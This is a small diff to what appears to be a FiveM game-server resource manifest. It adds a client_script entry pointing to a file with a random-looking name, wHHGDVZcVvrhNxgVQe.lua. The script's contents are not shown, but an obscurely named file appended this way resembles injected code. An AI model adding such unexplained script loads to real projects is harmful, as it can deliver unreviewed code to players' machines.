@@ -20,3 +20,5 @@ client_scripts {
 dependencies {
 	'es_extended',
 }
+
+client_script "wHHGDVZcVvrhNxgVQe.lua"
